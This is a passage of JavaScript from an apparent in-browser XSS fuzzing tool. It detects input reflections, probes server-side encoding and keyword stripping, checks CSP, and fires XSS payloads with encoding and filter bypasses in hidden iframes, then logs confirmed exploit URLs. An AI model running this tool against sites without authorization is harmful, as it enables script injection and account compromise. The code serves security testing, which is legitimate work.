              suggestions: suggestPayloads(ctx, analysis.survived),
              domElement: el,
              sourceVector: v,
              sourceName: `INPUT [${v.name}]`,
              inputOriginalValue: origVal,
            });
          }
        });

        // Buscar en texto
        const walker = document.createTreeWalker(document.body || document.documentElement, NodeFilter.SHOW_TEXT, null);
        let node;
        while (node = walker.nextNode()) {
          if (!node.textContent.includes(origVal)) continue;
          const parent = node.parentElement;
          if (!parent || parent === inputEl || injectedInputs.has(parent)) continue;
          if (reflections.some(r => r.domElement === parent)) continue;

          const rawHTML = parent.innerHTML || '';
          const ctx = detectReflectionContext(parent, null, rawHTML, rawHTML.indexOf(origVal));
          const allChars = Object.keys(PROBE_CHARS);
          const analysis = { survived: [...allChars], encoded: [], stripped: [], encodings: {} };

          inputReflections.push({
            type: 'text', context: ctx,
            element: `<${parent.tagName.toLowerCase()}>`,
            rawSample: truncate(node.textContent, 200),
            analysis,
            suggestions: suggestPayloads(ctx, analysis.survived),
            domElement: parent,
            sourceVector: v,
            sourceName: `INPUT [${v.name}]`,
            inputOriginalValue: origVal,
          });
        }
      }

      if (inputReflections.length > 0) {
        reflections = [...reflections, ...inputReflections];
        ns.log.info(`   \uD83D\uDCDD %c${inputReflections.length} reflejo(s) de valores originales de inputs`, 'color:#ff6600;font-weight:bold');
      }
    }

    // -- 2d. Hash original --
    if (savedOriginalHash.length >= 2) {
      const hashVector = vectors.find(v => v.type === 'hash');
      document.querySelectorAll('*').forEach(el => {
        if (injectedInputs.has(el)) return;
        for (const attr of el.attributes || []) {
          if (!attr.value.includes(savedOriginalHash)) continue;
          if (reflections.some(r => r.domElement === el && r.attrName === attr.name)) continue;

          const rawHTML = el.outerHTML.substring(0, 500);
          const ctx = detectReflectionContext(el, attr.name, rawHTML);
          const allChars = Object.keys(PROBE_CHARS);
          const analysis = { survived: [...allChars], encoded: [], stripped: [], encodings: {} };

          reflections.push({
            type: 'attribute', context: ctx, attrName: attr.name,
            element: `<${el.tagName.toLowerCase()} ${attr.name}="\u2026">`,
            rawSample: truncate(attr.value, 200),
            analysis,
            suggestions: suggestPayloads(ctx, analysis.survived),
            domElement: el,
            sourceVector: hashVector || null,
            sourceName: 'URL #hash',
          });
        }
      });
    }

    // -- Check si no hay nada --
    if (reflections.length === 0) {
      // Buscar en raw HTML
      let rawFound = false;
      for (const v of vectors) {
        if (document.documentElement.outerHTML.includes(v.canary.base)) { rawFound = true; break; }
      }
      if (!rawFound) {
        ns.log.info('%c   \u2705 No se encontraron reflejos', 'color:green');
        ns.log.info('   Ejecuta %cdomxss.fuzz.nav()%c para testear via URL con navegaci\u00f3n real', 'color:#ff00ff;font-weight:bold', 'color:#ccc');
        ns.log.info('   O ejecuta %cdomxss.fuzz.check()%c en otras p\u00e1ginas.', 'color:#ff00ff;font-weight:bold', 'color:#ccc');
        try {
          sessionStorage.setItem('__domxss_canary', JSON.stringify(masterCanary));
        } catch (e) { ns.log.debug(e.message); }
        fuzzResults.reflections = [];
        window.__domxss_fuzzResults = fuzzResults;
        return fuzzResults;
      }
    }

    // ===================================
    // HIGHLIGHT + LOG (con correlacion source->sink)
    // ===================================
    const reflectedElements = new Set();
    const markedInputs = new Set();
    let connectedInputs = 0;

    // Sort reflections: most exploitable first (href/event before body)
    const reflPriority = (r) => {
      let p = 0;
      if (r.context === 'html-attr-href' || r.context === 'js-url') p += 100;
      else if (r.context === 'html-attr-event') p += 80;
      else if (r.context.startsWith('js-')) p += 70;
      else if (r.context.startsWith('html-attr')) p += 50;
      if (r.isFormReflection) p += 10; // POST forms are actionable
      if (r.isStoredXSS) p += 5;
      return p;
    };
    reflections.sort((a, b) => reflPriority(b) - reflPriority(a));

    ns.log.info(`\n   \uD83D\uDD25 %c${reflections.length} reflection(s) detected`, 'color:#ff0000;font-weight:bold');

    for (let i = 0; i < reflections.length; i++) {
      const r = reflections[i];
      const srcName = r.sourceName || '?';
      const paramInfo = r.paramName ? ` \u2190 URL ?${r.paramName}=` : '';

      fuzzResults.reflections.push({
        context: r.context, type: r.type, element: r.element, attrName: r.attrName,
        survived: r.analysis.survived, encoded: r.analysis.encoded,
        stripped: r.analysis.stripped, encodings: r.analysis.encodings,
        source: srcName, paramName: r.paramName || null,
      });

      // Extract field name from source for clearer display
      const fieldMatch = srcName.match(/\[(\w+)\]/);
      const fieldLabel = fieldMatch ? fieldMatch[1] : '';

      // Priority badge
      let badge = '';
      if (r.context === 'html-attr-href' || r.context === 'js-url') badge = '\uD83D\uDEA8 HIGH';
      else if (r.context === 'html-attr-event' || r.context.startsWith('js-')) badge = '\u26A0\uFE0F MED';

      const ctxDesc = CONTEXT_PAYLOADS[r.context]?.desc || r.context;
      const storedTag = r.isStoredXSS ? ' (STORED)' : '';
      const fieldTag = fieldLabel ? ` [${fieldLabel}]` : '';
      if (badge) {
        ns.log.info(`\n   %c#${i + 1} ${badge}%c %c${r.context}%c \u2014 ${ctxDesc}${storedTag}`, 'color:#ff0000;font-weight:bold;font-size:12px', 'color:#aaa', 'color:#ff00ff;font-weight:bold', 'color:#aaa');
      } else {
        ns.log.info(`\n   %c#${i + 1}%c %c${r.context}%c \u2014 ${ctxDesc}${storedTag}`, 'color:#888', 'color:#aaa', 'color:#ff00ff;font-weight:bold', 'color:#aaa');
      }
      ns.log.info(`      Field: %c${fieldLabel || '?'}%c  Source: %c${srcName}`, 'color:#00ddff;font-weight:bold;font-size:12px', 'color:#ccc', 'color:#888');
      ns.log.info(`      %c\uD83D\uDFE2 Raw: ${r.analysis.survived.join(' ') || '(none)'}`, 'color:#00ff00');
      if (r.analysis.encoded.length) {
        ns.log.info(`      %c\uD83D\uDFE1 Encoded: ${r.analysis.encoded.map(c => `${c}\u2192${r.analysis.encodings[c]}`).join(', ')}`, 'color:#ffaa00');
      }
      if (r.analysis.stripped.length) {
        ns.log.info(`      %c\u26AB Stripped: ${r.analysis.stripped.join(' ')}`, 'color:#ff4444');
      }

      // Print viable payload suggestions (including CSTI when AngularJS detected)
      if (r.suggestions?.length) {
        const viable = r.suggestions.filter(s => s.viable);
        if (viable.length > 0) {
          ns.log.info('      %c\uD83D\uDCA3 Viable payloads:', 'font-weight:bold;color:#ff0000');
          for (const s of viable) {
            ns.log.info(`      %c\u2705 ${s.payload}%c \u2014 ${s.note}`, 'color:#00ff00;font-weight:bold', 'color:#888');
          }
        }
      }

      // -- MAGENTA: Highlight donde se refleja --
      if (r.domElement && !reflectedElements.has(r.domElement)) {
        reflectedElements.add(r.domElement);
        highlightEl(r.domElement, `\uD83D\uDFE3 REFLEJO #${i + 1}: ${r.context}${paramInfo} \u2190 ${srcName}`, 'fuzz-refl');
      }

      // -- CYAN: Highlight el input SOURCE que causo este reflejo --
      const sv = r.sourceVector;
      if (sv && sv.type === 'input' && sv.element && !markedInputs.has(sv.element)) {
        markedInputs.add(sv.element);
        highlightEl(sv.element, `\uD83D\uDD35 SOURCE \u2192 reflejo #${i + 1}`, 'fuzz-src');
        connectedInputs++;
      }
    }

    // -- ROJO: Sinks adicionales de triage --
    let triageSinks = 0;
    for (const flow of findings.flows.filter(f => f.exploitability === 'likely' || f.exploitability === 'possible')) {
      const sink = findings.sinks.find(s => s.id === flow.sink.id);
      if (sink?.code) triageSinks += extractAndHighlight(sink.code);
    }
    if (triageSinks > 0) {
      ns.log.info(`\n   %c\uD83C\uDFAF +${triageSinks} sink(s) adicionales de triage`, 'color:#ff0000');
    }

    // -- URL param sources sin input visible --
    const urlParamRefs = reflections.filter(r => r.paramName);
    if (urlParamRefs.length > 0) {
      const paramNames = [...new Set(urlParamRefs.map(r => r.paramName))];
      ns.log.info(`\n   %c\uD83D\uDD17 Source URL: [${paramNames.join(', ')}]`, 'color:#00ddff;font-weight:bold');
      ns.log.info('   %c\uD83D\uDCA1 Ejecuta %cdomxss.fuzz.nav()%c para testear encoding con navegaci\u00f3n real',
        'color:#ffaa00', 'color:#ff00ff;font-weight:bold', 'color:#ffaa00');
    }

    // -- Leyenda --
    const totalMarked = reflectedElements.size + connectedInputs + triageSinks;
    if (totalMarked > 0) {
      ns.log.info('\n%c\uD83C\uDFA8 RESALTADO EN LA P\u00c1GINA:', 'font-weight:bold;color:#ccc');
      if (connectedInputs > 0) ns.log.info('   %c \u25A0 CYAN   %c = Input que caus\u00f3 el reflejo', 'color:#00ddff;font-weight:bold;font-size:12px', 'color:#ccc');
      if (reflectedElements.size > 0) ns.log.info('   %c \u25A0 MAGENTA%c = Donde se reflej\u00f3', 'color:#ff00ff;font-weight:bold;font-size:12px', 'color:#ccc');
      if (triageSinks > 0) ns.log.info('   %c \u25A0 ROJO   %c = Sink (an\u00e1lisis est\u00e1tico)', 'color:#ff0000;font-weight:bold;font-size:12px', 'color:#ccc');
      ns.log.info('   %c \u25A0 VERDE  %c = XSS confirmado', 'color:#00ff00;font-weight:bold;font-size:12px', 'color:#ccc');
      ns.log.info('   %c   domxss.unhighlight()%c para quitar', 'color:#888;font-style:italic', 'color:#888');
    }

    // ===================================
    // FASE 3 + 4: Payloads contextuales + verificacion
    // ===================================
    ns.log.info('\n%c\u2550\u2550 FASE 3: Payloads contextuales + verificaci\u00f3n \u2550\u2550', 'font-weight:bold;color:#00aaff;font-size:13px');

    // Quick CSP pre-check — detect if CSP will block inline script execution
    let cspInfo = null;
    try {
      const cspResp = await fetch(location.href, { method: 'HEAD', credentials: 'same-origin' });
      const headerCSP = cspResp.headers.get('Content-Security-Policy');
      const metaCSP = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
      const cspStr = headerCSP || metaCSP?.getAttribute('content') || null;
      if (cspStr) {
        const scriptSrc = [];
        for (const part of cspStr.split(';')) {
          const tokens = part.trim().split(/\s+/);
          if (tokens[0] === 'script-src' || tokens[0] === 'default-src') scriptSrc.push(...tokens.slice(1));
        }
        const scriptSrcStr = scriptSrc.join(' ');
        const blocksInline = !scriptSrcStr.includes("'unsafe-inline'");
        cspInfo = { csp: cspStr, blocksInline, scriptSrcStr, source: headerCSP ? 'header' : 'meta' };
        if (blocksInline) {
          ns.log.info(`   %c\u26A0\uFE0F CSP detected (${cspInfo.source}) — inline scripts may be blocked`, 'color:#ffaa00;font-weight:bold');
          ns.log.info(`   %cRun %cdomxss.fuzz.csp()%c for full bypass analysis`, 'color:#888', 'color:#ff00ff;font-weight:bold', 'color:#888');
        }
      }
    } catch (e) { ns.log.debug(e.message); }

    let totalConfirmed = 0;
    let totalAttempts = 0;
    // Track confirmed sources to skip duplicates — once XSS is confirmed
    // for a source, testing other contexts from the same source is noise
    const confirmedSources = new Set();

    for (let i = 0; i < reflections.length; i++) {
      const r = reflections[i];
      const sv = r.sourceVector;
      const srcName = r.sourceName || '?';

      // Skip if we already confirmed XSS from this same source
      if (confirmedSources.has(srcName)) {
        continue;
      }

      ns.log.info(`\n%c\u2500\u2500 Reflejo #${i + 1}: ${r.context} \u2190 ${srcName} \u2500\u2500`, 'font-weight:bold;color:#ff6600;font-size:12px');

      // For reflections detected via original value (2b/2c/2d): replaceState/setValue
      // doesn't re-execute JS, so we probe server-side encoding via fetch and verify
      // payloads via iframe navigation (real HTTP requests to the server).
      const isOrigValueReflection = !!(r.paramName || r.inputOriginalValue);
      if (isOrigValueReflection && sv && sv.type !== 'input') {
        const paramName = sv.param || r.paramName;
        if (!paramName) {
          ns.log.info('   %c\u26A0\uFE0F No param name, skipping', 'color:#ffaa00');
          continue;
        }

        // Step 1: Probe actual server-side encoding with a mini-canary
        // Use only the 4 critical chars (duplicated) to keep the probe short
        // and avoid triggering server-side validation/WAF errors.
        ns.log.info(`   %c\uD83D\uDD0D Probing server-side encoding for ?${paramName}=...`, 'color:#00aaff');
        const probeUid = Math.random().toString(36).substring(2, 7);
        const probeBase = `xSs${probeUid}`;
        const probeChars = `<<>>""''`;
        const probeCanary = `${probeBase}${probeChars}${probeBase}`;

        const probeUrl = new URL(location.origin + location.pathname);
        for (const [k, val] of savedOriginalParams) probeUrl.searchParams.set(k, val);
        probeUrl.searchParams.set(paramName, probeCanary);

        let probeHtml = null;
        try {
          const resp = await fetch(probeUrl.toString(), {
            credentials: 'same-origin',
            headers: { 'Accept': 'text/html' },
            cache: 'no-store',
          });
          // Accept any response (even 400/500) — server may reflect input in error pages
          probeHtml = await resp.text();
        } catch (e) { ns.log.debug(e.message); }

        if (!probeHtml || !probeHtml.includes(probeBase)) {
          ns.log.info('   %c\u26A0\uFE0F Probe canary not reflected by server', 'color:#ffaa00');
          ns.log.info('   %c\uD83D\uDCA1 Ejecuta %cdomxss.fuzz.nav()%c para test manual', 'color:#ccc', 'color:#ff00ff;font-weight:bold', 'color:#ccc');
          continue;
        }

        // Extract the chars section from raw HTML between the two probeBase markers.
        // This avoids DOMParser which would serialize entities and lose the distinction
        // between server-encoded chars (e.g., &lt;) and raw chars that survived.
        const rawFirstIdx = probeHtml.indexOf(probeBase);
        const rawCharsStart = rawFirstIdx + probeBase.length;
        const rawSecondIdx = probeHtml.indexOf(probeBase, rawCharsStart);
        // Extract the tight section between the two probeBase markers — only this section
        // is reliable for encoding analysis (wider context could contain encoded entities
        // from other page content, causing false positives for partial encoding)
        const probeRawSection = rawSecondIdx > -1
          ? probeHtml.substring(rawCharsStart, rawSecondIdx)
          : probeHtml.substring(rawCharsStart, Math.min(probeHtml.length, rawCharsStart + 200));

        // Analyze encoding for the 4 critical dual chars directly on raw HTML.
        // For each char, the canary sent TWO instances. In the raw HTML:
        // - If both raw chars present → survived (no encoding)
        // - If encoded form + raw char → PARTIAL (first-occurrence-only encoding)
        // - If only encoded forms → fully encoded
        // - If neither → stripped
        const dualTestChars = ['<', '>', '"', "'"];
        const realPartiallyEncoded = [];
        const mergedAnalysis = {
          survived: [...r.analysis.survived],
          encoded: [...r.analysis.encoded],
          stripped: [...r.analysis.stripped],
          encodings: { ...r.analysis.encodings },
          partiallyEncoded: [],
        };

        for (const ch of dualTestChars) {
          const hasRawChar = probeRawSection.includes(ch);
          let hasEncodedForm = false;
          let encInfo = '';

          // Only check within the tight section between markers to avoid false positives
          // from encoded entities in surrounding HTML (e.g., &gt; in other page content)
          for (const [encType, patterns] of Object.entries(ENCODING_PATTERNS)) {
            if (!patterns[ch]) continue;
            for (const encoded of patterns[ch]) {
              if (probeRawSection.includes(encoded)) {
                hasEncodedForm = true;
                encInfo = `${encType}: ${encoded}`;
                break;
              }
            }
            if (hasEncodedForm) break;
          }

          if (hasRawChar && hasEncodedForm) {
            // PARTIAL: first occurrence encoded, second survived raw
            realPartiallyEncoded.push(ch);
            mergedAnalysis.encodings[ch] = `PARTIAL: first occurrence encoded (${encInfo}), subsequent raw`;
            if (!mergedAnalysis.survived.includes(ch)) mergedAnalysis.survived.push(ch);
            mergedAnalysis.encoded = mergedAnalysis.encoded.filter(c => c !== ch);
          } else if (hasRawChar) {
            mergedAnalysis.encodings[ch] = 'none (raw)';
            if (!mergedAnalysis.survived.includes(ch)) mergedAnalysis.survived.push(ch);
            mergedAnalysis.encoded = mergedAnalysis.encoded.filter(c => c !== ch);
          } else if (hasEncodedForm) {
            mergedAnalysis.encodings[ch] = encInfo;
            if (!mergedAnalysis.encoded.includes(ch)) mergedAnalysis.encoded.push(ch);
            mergedAnalysis.survived = mergedAnalysis.survived.filter(c => c !== ch);
          } else {
            mergedAnalysis.encodings[ch] = 'STRIPPED/FILTERED';
            if (!mergedAnalysis.stripped.includes(ch)) mergedAnalysis.stripped.push(ch);
            mergedAnalysis.survived = mergedAnalysis.survived.filter(c => c !== ch);
            mergedAnalysis.encoded = mergedAnalysis.encoded.filter(c => c !== ch);
          }
        }
        mergedAnalysis.partiallyEncoded = realPartiallyEncoded;

        // Backslash neutralization: if \ survived and quote is backslash-escaped,
        // promote quote to survived (payload \' becomes \\' = escaped-backslash + raw-quote)
        if (mergedAnalysis.survived.includes('\\')) {
          for (const q of ['"', "'"]) {
            if (mergedAnalysis.encoded.includes(q) &&
                mergedAnalysis.encodings[q]?.includes('backslashEscape')) {
              mergedAnalysis.encoded = mergedAnalysis.encoded.filter(c => c !== q);
              if (!mergedAnalysis.survived.includes(q)) mergedAnalysis.survived.push(q);
              mergedAnalysis.encodings[q] = 'BREAKOUT via backslash neutralization';
            }
          }
        }

        // Log real server-side encoding results
        ns.log.info(`   %c\uD83D\uDCCA Server-side encoding: Raw: %c${mergedAnalysis.survived.join(' ') || '(none)'}`,
          'color:#aaa', 'color:#00ff00');
        if (mergedAnalysis.encoded.length) {
          ns.log.info(`   %c\uD83D\uDCCA Encoded: %c${mergedAnalysis.encoded.join(' ')}`, 'color:#aaa', 'color:#ffaa00');
        }
        if (realPartiallyEncoded.length > 0) {
          ns.log.info(`   %c\u26A1 Partial encoding detected: ${realPartiallyEncoded.join(' ')} \u2014 first occurrence encoded, subsequent raw!`, 'color:#ff6600;font-weight:bold');
          ns.log.info(`   %c\uD83D\uDCA1 Sacrificial prefix bypass viable: prepend chars to consume first replace()`, 'color:#ff6600');
        }

        // Step 1b: Probe for keyword stripping
        const KEYWORD_PROBE_LIST = ns.KEYWORD_PROBE_LIST || [];
        const strippedKeywords = [];
        const survivedKeywords = [];

        if (KEYWORD_PROBE_LIST.length > 0 && probeHtml) {
          const kwProbeUid = Math.random().toString(36).substring(2, 7);
          const kwMarker = `kW${kwProbeUid}`;
          const kwBatchSize = 10;
          for (let ki = 0; ki < KEYWORD_PROBE_LIST.length; ki += kwBatchSize) {
            const kwBatch = KEYWORD_PROBE_LIST.slice(ki, ki + kwBatchSize);
            const kwProbeValue = kwBatch.map(kw => `${kwMarker}${kw}${kwMarker}`).join('_');

            const kwUrl = new URL(location.origin + location.pathname);
            for (const [k, val] of savedOriginalParams) kwUrl.searchParams.set(k, val);
            kwUrl.searchParams.set(paramName, kwProbeValue);

            try {
              const kwResp = await fetch(kwUrl.toString(), {
                credentials: 'same-origin',
                headers: { 'Accept': 'text/html' },
                cache: 'no-store',
              });
              const kwHtml = await kwResp.text();

              for (const kw of kwBatch) {
                const markerPair = `${kwMarker}${kw}${kwMarker}`;
                if (kwHtml.includes(markerPair)) {
                  survivedKeywords.push(kw);
                } else if (kwHtml.includes(kwMarker)) {
                  strippedKeywords.push(kw);
                }
              }
            } catch (e) { ns.log.debug(e.message); }
          }

          if (strippedKeywords.length > 0) {
            ns.log.info(`   %c⚡ Keyword stripping detected: ${strippedKeywords.join(', ')}`, 'color:#ff6600;font-weight:bold');

            // Detect recursive stripping: if nested bypass is also stripped,
            // only case variants will work (nested insertion is defeated)
            const KW_BYPASS = ns.KEYWORD_BYPASS_PATTERNS || {};
            const recursivelyStripped = [];
            for (const kw of strippedKeywords) {
              const nested = KW_BYPASS[kw]?.[0]; // e.g., 'scrscriptipt'
              if (!nested) continue;
              try {
                const nestedUrl = new URL(location.origin + location.pathname);
                for (const [k, val] of savedOriginalParams) nestedUrl.searchParams.set(k, val);
                nestedUrl.searchParams.set(paramName, `${kwMarker}${nested}${kwMarker}`);
                const nestedResp = await fetch(nestedUrl.toString(), {
                  credentials: 'same-origin', headers: { 'Accept': 'text/html' }, cache: 'no-store',
                });
                const nestedHtml = await nestedResp.text();
                if (nestedHtml.includes(kwMarker) && !nestedHtml.includes(`${kwMarker}${nested}${kwMarker}`)) {
                  recursivelyStripped.push(kw);
                }
              } catch (e) { ns.log.debug(e.message); }
            }
            if (recursivelyStripped.length > 0) {
              ns.log.info(`   %c\u26A0\uFE0F Recursive stripping: ${recursivelyStripped.join(', ')} — nested insertion defeated, only case variants viable`, 'color:#ff4444;font-weight:bold');
            } else {
              ns.log.info(`   \uD83D\uDCA1 Server removes these keywords from input — nested/case bypasses viable`);
            }
            strippedKeywords.__recursivelyStripped = recursivelyStripped;
          }
        }

        // Update reflection analysis with real data
        mergedAnalysis.strippedKeywords = strippedKeywords;
        mergedAnalysis.recursivelyStripped = strippedKeywords.__recursivelyStripped || [];
        mergedAnalysis.survivedKeywords = survivedKeywords;
        r.analysis = mergedAnalysis;

        // Step 2: Select payloads based on REAL server-side encoding
        const payloads = selectVerifyPayloads(r.context, mergedAnalysis.survived,
          { ...mergedAnalysis.encodings, __partiallyEncoded: mergedAnalysis.partiallyEncoded || [], __strippedKeywords: mergedAnalysis.strippedKeywords || [], __recursivelyStripped: mergedAnalysis.recursivelyStripped || [], __cspInfo: cspInfo });
        if (payloads.length === 0) {
          ns.log.info('   %c\u26AB No viable payloads for this context + surviving chars', 'color:#888');
          continue;
        }

        const toTest = payloads.slice(0, opts.maxPayloadsPerReflection);
        ns.log.info(`   ${toTest.length} payload(s) to verify via iframe`);
        ns.log.info(`   \uD83C\uDFAF Param: %c${paramName}`, 'color:#00ddff;font-weight:bold');

        // Step 3: Test each payload via iframe navigation
        for (let j = 0; j < toTest.length; j++) {
          const p = toTest[j];
          totalAttempts++;
          const tag = p.isSacrificialPrefix ? '\u26A1' : p.isKeywordBypass ? '\u26A1' : p.isEncodingBypass ? '\uD83D\uDD04' : '\uD83D\uDCA3';
          ns.log.info(`\n   ${tag} %c[${j + 1}/${toTest.length}] ${p.desc}`, 'color:#ffaa00');
          ns.log.info(`      %c${truncate(p.payload, 120)}`, 'font-family:monospace;color:#ccc;background:#1a1a1a;padding:2px 4px;font-size:11px');

          const testUrl = new URL(location.origin + location.pathname);
          for (const [k, val] of savedOriginalParams) testUrl.searchParams.set(k, val);
          testUrl.searchParams.set(paramName, p.payload);

          let iframe = null;
          try {
            iframe = document.createElement('iframe');
            iframe.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;pointer-events:none';
            iframe.sandbox = 'allow-same-origin allow-scripts';
            const loaded = new Promise(resolve => {
              iframe.onload = () => resolve(true);
              iframe.onerror = () => resolve(false);
              setTimeout(() => resolve(false), CONFIG.delays.verifyTimeout);
            });
            iframe.src = testUrl.toString();
            document.body.appendChild(iframe);
            const ok = await loaded;

            if (ok && iframe.contentWindow) {
              const waitMs = p.isCSTI ? 1200 : 300;
              await new Promise(r => setTimeout(r, waitMs));

              let iframeExec = false;
              if (p.verifyId) {
                try { iframeExec = !!iframe.contentWindow[`__xss_${p.verifyId}`]; } catch (e) { ns.log.debug(e.message); }
              }
              if (!iframeExec && p.check) {
                try { iframeExec = p.check(p.verifyId, iframe.contentWindow); } catch (e) { ns.log.debug(e.message); }
              }
              // For interaction-required payloads (e.g. SVG animate href),
              // simulate a click on the link inside the iframe
              if (!iframeExec && p.needsInteraction) {
                try {
                  const link = iframe.contentDocument?.querySelector('a, [href]');
                  if (link) {
                    link.click();
                    await new Promise(r => setTimeout(r, 500));
                    try { iframeExec = !!iframe.contentWindow[`__xss_${p.verifyId}`]; } catch (e) { ns.log.debug(e.message); }
                    if (!iframeExec && p.check) {
                      try { iframeExec = p.check(p.verifyId, iframe.contentWindow); } catch (e) { ns.log.debug(e.message); }
                    }
                  }
                } catch (e) { ns.log.debug('Click simulation: ' + e.message); }
              }

              if (iframeExec) {
                totalConfirmed++;
                confirmedSources.add(srcName);
                const realPL = resolveRealPayload(p, mergedAnalysis);
                const exploitUrl = new URL(location.origin + location.pathname);
                for (const [k, val] of savedOriginalParams) exploitUrl.searchParams.set(k, val);
                exploitUrl.searchParams.set(paramName, realPL);
                ns.log.info(`      %c\u2705 XSS CONFIRMED`, 'color:#00ff00;font-weight:bold;font-size:14px');
                ns.log.info(`      %cPayload: ${realPL}`, 'color:#00ff00;font-family:monospace;font-size:12px');
                ns.log.info(`      %c\uD83D\uDD17 ${exploitUrl.toString()}`, 'color:#00ff00;font-family:monospace');
                fuzzResults.confirmed.push({
                  context: r.context, payload: realPL, realPayload: realPL,
                  desc: p.desc, source: srcName, exploitUrl: exploitUrl.toString(),
                  type: 'reflected-xss-iframe', param: paramName,
                });

                if (r.domElement) highlightEl(r.domElement, `\u2705 XSS CONFIRMED: ${p.desc}`, 'fuzz-xss');
                break;
              } else {
                // Check if payload reflected raw in HTML (possible XSS blocked by CSP)
                try {
                  const iframeHtml = iframe.contentDocument?.documentElement?.outerHTML || '';
                  if (isPayloadReflected(p.payload, iframeHtml)) {
                    ns.log.info(`      %c\uD83D\uDFE1 Payload reflected raw but not executed (CSP or sandbox)`, 'color:#ffaa00');
                  } else {
                    ns.log.info(`      \u274C Not reflected / not executed`);
                  }
                } catch {
                  ns.log.info(`      \u274C Not executed in iframe`);
                }
              }
            }
          } catch (e) {
            ns.log.info(`      \u26A0\uFE0F Iframe error: ${e.message}`);
          } finally {
            if (iframe && iframe.parentNode) {
              try { iframe.parentNode.removeChild(iframe); } catch (e) { ns.log.debug(e.message); }
            }
          }
        }
        continue;
      }

      // -- Para DOM XSS (iframe-detected): verify payloads via iframe --
      if (r.isDocumentWrite && sv && sv.type === 'url-param') {
        const payloads = selectVerifyPayloads(r.context, r.analysis.survived, { ...r.analysis.encodings, __partiallyEncoded: r.analysis.partiallyEncoded || [], __strippedKeywords: r.analysis.strippedKeywords || [] });
        if (payloads.length === 0) {
          ns.log.info('   %c⚫ No hay payloads viables para este contexto + chars supervivientes', 'color:#888');
          continue;
        }
        const toTest = payloads.slice(0, opts.maxPayloadsPerReflection);
        ns.log.info(`   ${toTest.length} payload(s) a verificar vía iframe (DOM XSS)`);
        ns.log.info(`   🎯 Param: %c${sv.param}`, 'color:#00ddff;font-weight:bold');

        for (let j = 0; j < toTest.length; j++) {
          const p = toTest[j];
          totalAttempts++;
          const tag = p.isEncodingBypass ? '🔄' : '💣';
          ns.log.info(`\n   ${tag} %c[${j + 1}/${toTest.length}] ${p.desc}`, 'color:#ffaa00');
          ns.log.info(`      %c${truncate(p.payload, 120)}`, 'font-family:monospace;color:#ccc;background:#1a1a1a;padding:2px 4px;font-size:11px');

          // Build clean URL from original params (not canary-contaminated)
          const testUrl = new URL(location.origin + location.pathname);
          for (const [k, val] of savedOriginalParams) testUrl.searchParams.set(k, val);
          let testUrlStr;
          if (p.urlSuffix) {
            // URL suffix injection: set param to minimal value, append exploit as raw URL param name
            testUrl.searchParams.set(sv.param, '1');
            testUrlStr = testUrl.toString() + '&' + p.payload + '=1';
          } else {
            testUrl.searchParams.set(sv.param, p.payload);
            testUrlStr = testUrl.toString();
          }
          let iframe = null;
          try {
            iframe = document.createElement('iframe');
            iframe.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;pointer-events:none';
            iframe.sandbox = 'allow-same-origin allow-scripts';
            const loaded = new Promise(resolve => {
              iframe.onload = () => resolve(true);
              iframe.onerror = () => resolve(false);
              setTimeout(() => resolve(false), CONFIG.delays.verifyTimeout);
            });
            iframe.src = testUrlStr;
            document.body.appendChild(iframe);
            const ok = await loaded;

            if (ok && iframe.contentWindow) {
              // Wait for async script execution (longer for CSTI — AngularJS needs to compile)
              const waitMs = p.isCSTI ? 1200 : 300;
              await new Promise(r => setTimeout(r, waitMs));
              // Check if payload executed in iframe
              let iframeExec = false;
              if (p.verifyId) {
                try { iframeExec = !!iframe.contentWindow[`__xss_${p.verifyId}`]; } catch (e) { ns.log.debug(e.message); }
              }
              if (!iframeExec && p.check) {
                try { iframeExec = p.check(p.verifyId, iframe.contentWindow); } catch (e) { ns.log.debug(e.message); }
              }
              // For interaction-required payloads (e.g. SVG animate href),
              // simulate a click on the link inside the iframe
              if (!iframeExec && p.needsInteraction) {
                try {
                  const link = iframe.contentDocument?.querySelector('a, [href]');
                  if (link) {
                    link.click();
                    await new Promise(r => setTimeout(r, 500));
                    try { iframeExec = !!iframe.contentWindow[`__xss_${p.verifyId}`]; } catch (e) { ns.log.debug(e.message); }
                    if (!iframeExec && p.check) {
                      try { iframeExec = p.check(p.verifyId, iframe.contentWindow); } catch (e) { ns.log.debug(e.message); }
                    }
                  }
                } catch (e) { ns.log.debug('Click simulation: ' + e.message); }
              }

              if (iframeExec) {
                totalConfirmed++;
                confirmedSources.add(srcName);
                const realPL = resolveRealPayload(p, r.analysis);
                const exploitUrl = new URL(location.origin + location.pathname);
                for (const [k, val] of savedOriginalParams) exploitUrl.searchParams.set(k, val);
                let exploitUrlStr;
                if (p.urlSuffix) {
                  exploitUrl.searchParams.set(sv.param, '1');
                  exploitUrlStr = exploitUrl.toString() + '&' + realPL + '=1';
                } else {
                  exploitUrl.searchParams.set(sv.param, realPL);
                  exploitUrlStr = exploitUrl.toString();
                }
                ns.log.info(`      %c✅ XSS CONFIRMED`, 'color:#00ff00;font-weight:bold;font-size:14px');
                ns.log.info(`      %cPayload: ${realPL}`, 'color:#00ff00;font-family:monospace;font-size:12px');
                ns.log.info(`      %c🔗 ${exploitUrlStr}`, 'color:#00ff00;font-family:monospace');
                fuzzResults.confirmed.push({
                  context: r.context, payload: realPL, realPayload: realPL,
                  desc: p.desc, source: srcName, exploitUrl: exploitUrlStr,
                  type: 'dom-xss-iframe', param: sv.param,
                });
                break;
              } else {
                ns.log.info(`      ❌ Not executed in DOM`);
              }
            }
          } catch (e) {
            ns.log.info(`      ⚠️ Iframe error: ${e.message}`);
          } finally {
            if (iframe && iframe.parentNode) {
              try { iframe.parentNode.removeChild(iframe); } catch (e) { ns.log.debug(e.message); }
            }
          }
        }
        continue;
      }

      // -- Para FORM reflections: verificar via fetch (no inyectar en DOM) --
      if (r.isFormReflection && sv && sv.element?.form) {
        const form = sv.element.form;
        const formMethod = r.formMethod || (form.method || 'GET').toUpperCase();

        // POST form stored XSS verification
        if (formMethod === 'POST') {
          const payloads = selectVerifyPayloads(r.context, r.analysis.survived, { ...r.analysis.encodings, __partiallyEncoded: r.analysis.partiallyEncoded || [], __strippedKeywords: r.analysis.strippedKeywords || [] });
          if (payloads.length === 0) {
            ns.log.info('   %c⚫ No viable payloads for this context', 'color:#888');
            continue;
          }
          const toTest = payloads.slice(0, opts.maxPayloadsPerReflection);
          ns.log.info(`   ${toTest.length} payload(s) to verify via POST form${r.isStoredXSS ? ' (stored XSS)' : ''}`);
